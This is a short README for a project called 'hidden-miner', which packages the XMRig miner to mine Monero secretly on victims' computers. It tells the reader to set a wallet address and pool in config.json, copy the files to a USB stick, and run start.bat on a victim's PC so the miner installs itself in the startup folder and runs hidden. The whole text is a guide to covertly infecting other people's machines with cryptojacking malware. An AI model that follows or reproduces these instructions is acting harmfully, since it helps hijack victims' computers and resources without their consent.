# hidden-miner
A program based on XMRig to mine monero secretly on the victim's computer. Made to be put on a usb stick to infect PCs easily.


# How to setup

You will start by needing a Monero address, a monero mining pool, (I suggest moneroocean) and a brain.

Start by going in xmrig/config.json and change the address with yours, change the pool with the wanted one, or just use the default one that is already there. You can then place all the files on a USB stick to infect computers easily. just run start.bat to infect the victim, and the miner will be put in the startup folder, it will also be running secretly.
